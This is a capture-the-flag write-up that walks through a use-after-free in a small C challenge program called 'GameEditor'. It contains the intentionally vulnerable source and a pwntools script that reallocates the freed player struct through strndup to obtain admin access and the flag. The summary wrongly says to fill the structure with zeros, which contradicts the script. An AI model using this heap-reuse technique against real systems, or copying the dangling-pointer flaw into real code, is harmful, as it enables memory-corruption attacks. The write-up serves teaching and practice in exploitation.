---
title: Sogeti Qualif - pwn - GameEditor
published: true
---

# [](#pwn1)PWN: GameEditor (Free version) [ 486 points ] (Author: Touriste)

I was given this challenge after my teammates flagged it on the "sogeti qualif" platform. I wanted to give it a try, so here is my solution.

## Presentation
We were given a source code file and an IP address to try our payloads.
```c
/**
 * Filename: uaf.c
 * Author: Romain Bentz (pixis)
 * Description: Pown challenge for CTF Sogeti
 * Usage: ./uaf
 * Compilation: gcc -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -o uaf uaf.c
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_NAME_SIZE   16

typedef struct player {
  char name[MAX_NAME_SIZE];
  int64_t isAdmin;
} player_t;

char *game_title=NULL;

/* 
Prevent double free
*/
int is_player_freed=1;
int is_title_freed=1;


int main(int Count, char *Strings[])
{   
    char line[128];
    player_t *player = NULL;
    while(1) {
        printf(
            "  _______ _    _ ______    _____          __  __ ______ \n"
            " |__   __| |  | |  ____|  / ____|   /\\   |  \\/  |  ____|\n"
            "    | |  | |__| | |__    | |  __   /  \\  | \\  / | |__   \n"
            "    | |  |  __  |  __|   | | |_ | / /\\ \\ | |\\/| |  __|  \n"
            "    | |  | |  | | |____  | |__| |/ ____ \\| |  | | |____ \n"
            "    |_|  |_|  |_|______|  \\_____/_/    \\_\\_|  |_|______|\n"
            "                                                        \n"
            "                                                        \n"
            "\n"
            "Game information\n"
            "----------------\n"
            "\tPlayer name\t-->\t%s\n"
            "\tGame title\t-->\t%s\n"
            "\n"
            "Commands\n"
            "--------\n"
            "\tset <Player name>\t-\tSet player's name\n"
            "\ttitle <Game title>\t-\tSet game's title\n"
            "\tdel\t\t\t-\tDelete player's name\n"
            "\tlogin\t\t\t-\t[ADMIN AREA] Login into the game\n"
            "\texit\t\t\t-\tExit :(\n"
            "\n"
            "> ",
            player == NULL ? "(Not set)" : player->name, game_title == NULL ? "(Not set)" : game_title);

        if (fgets(line, sizeof(line), stdin) == NULL) break;


        if (strncmp(line, "set ", 4) == 0) {
            if (strlen(line + 4) > 1 && strlen(line + 4) <= MAX_NAME_SIZE) {
                // Free old player if set
                if (player != NULL && is_player_freed == 0) {
                    free(player);
                    is_player_freed = 1;
                }
                player = malloc(sizeof(player_t));
                
                // Fresh new player
                memset(player, 0, sizeof(player_t));
                
                is_player_freed = 0;
                
                // Replace trailing \n with \0
                strncpy(player->name, line + 4, strlen(line+4)-1);
                player->name[strlen(line+4)] = 0;

                // You're not admin, duh.
                player->isAdmin = 0;
            } else {
                printf("Maximum name size is %d characters\n", MAX_NAME_SIZE-1);
            }
        }

        if (strncmp(line, "title ", 6) == 0) {
            // Free old title if set
            if (game_title != NULL && is_title_freed == 0) {
                free(game_title);
                is_title_freed = 1;
            }

            game_title = strndup(line+6, strlen(line+6)-1);
            is_title_freed = 0;
        }

        if (strncmp(line, "del", 3) == 0) {
            // Free player if set
            if (player != NULL && is_player_freed == 0) {
                free(player);
                is_player_freed = 1;
            }
        }

        if (strncmp(line, "login", 5) == 0) {
            // If you're admin, go get your cookie !
            if (player != NULL) {
                printf("%s\n", player->isAdmin == 0 ? "Nop" : "SCE{flag}");
            }
        }

        if (strncmp(line, "exit", 4) == 0) {
            // Exit nicely without memory leaks
            if (player != NULL && is_player_freed == 0) {
                free(player);
            }
            if (game_title != NULL && is_title_freed == 0) {
                free(game_title);
            }
            
            // I'm quite polite.
            printf("'k Bye !\n");

            return EXIT_SUCCESS;
        }
    }
    return EXIT_SUCCESS;
}
```

The title makes it obvious, the goal of this challenge is to exploit a [**Use After Free**](https://www.owasp.org/index.php/Using_freed_memory) vulnerability.

## Goal
Obviously the goal of this challenge is to retrieve the flag stored in the binary.
```
if (strncmp(line, "login", 5) == 0) {
    // If you're admin, go get your cookie !
    if (player != NULL) {
        printf("%s\n", player->isAdmin == 0 ? "Nop" : "SCE{flag}");
    }
}
```
If we manage to set player->isAdmin to a value that is **anything but 0**, the binary will drop the flag.


## Recon

Since it seems to be a *UAF* challenge, let's take a look at the pieces of the code responsible for *allocation and/or disallocation* of variables in memory.


### Allocation routine
```c
// Free old player if set
if (player != NULL && is_player_freed == 0) {
    free(player);
    is_player_freed = 1;
}
player = malloc(sizeof(player_t));

// Fresh new player
memset(player, 0, sizeof(player_t));

is_player_freed = 0;

// Replace trailing \n with \0
strncpy(player->name, line + 4, strlen(line+4)-1);
player->name[strlen(line+4)] = 0;

// You're not admin, duh.
player->isAdmin = 0;
```
It allocates *sizeof(player_t)* into the __global variable__ "*player*".
The first condition avoids [**double-free**](https://www.owasp.org/index.php/Doubly_freeing_memory) issues.
We can see that the all fields are correctly initialized and thus, no vulnerability here.

Player points to memory:

![player points to memory](/images/writeups/sogeti/pwn/01_player.png)

### Disallocation routine
```c
// Free player if set
if (player != NULL && is_player_freed == 0) {
    free(player);
    is_player_freed = 1;
}
```
This part is more interesting: the memory allocated for the *player_t* structure is freed but the pointer stored in the __player__ global variable is not rewritten.

We have here a **dangling pointer**: after this routine **player** will point to an address in the heap that is not allocated anymore.

Now player points to unallocated data in memory:

![players points to unallocated data](/images/writeups/sogeti/pwn/02_player_unallocated.png)

## Re-allocating memory at the same place

### Why?

The goal here is to re-allocate memory. 
This newly allocated memory will be placed at the same position in the heap than the previous allocation. 

Remember that the player __player__ variable still points to the "old" memory area. After re-allocating memory, player will point to the new variable.

If we can control what's inside this newly allocated memory, we can recreate a "fake" player which has the *isAdmin* field set to anything else than 0.

For instance, imagine we allocated an array that contains 24 bytes set to 0x42:
![players points to re-allocated data](/images/writeups/sogeti/pwn/03_player_after_realloc.png)

The program would still read player as if it is a "player_t". So when ```player->isAdmin == 0 ? "Nop"``` is evalaluted,*player->isAdmin* would return __0x4242424242424242__.


### How to allocate again?

We cannot use the allocation routine shown above because player->isAdmin is set to zero.

But we have another function that allocates stuff on the heap:
```c
            // Free old title if set
            if (game_title != NULL && is_title_freed == 0) {
                free(game_title);
                is_title_freed = 1;
            }

            game_title = strndup(line+6, strlen(line+6)-1);
            is_title_freed = 0;
```

Let's see what *strndup* does:
```sh
man 3 strndup
```
> __DESCRIPTION__
>
> The __strdup()__ function returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc(3), and can be freed with free(3).
>
> The __strndup()__ function is similar, but copies at most n bytes.  If s is longer than n, only n bytes are copied, and a terminating null byte ('\0') is added.
   
So __strndup__ do call malloc and put a string in the memory! We can control the memory pointed by admin!


## Summary

* First we allocate memory for player (to set the pointer of __player__).
* Then free __player__ so we have a *dangling pointer*.
* Allocate memory with the routine that uses *strndup* and fill the structure with 0.
* Call the function that drops the flag.


Here is a snippet to do that:
```python
from pwn import *

with remote("quals.shadow-league.org", 5001) as p:
    p.sendline("set t35h_ftw")      # Allocate player
    p.sendline("del")               # Free player
    p.sendline("title " + "A" * 23) # Re allocate memory on top of player
    p.sendline("login")             # Drop the flag.
    p.readuntil("SCE{")
    flag = "SCE{" + p.readline()
    
log.info("Found the flag: {}".format(flag))
```
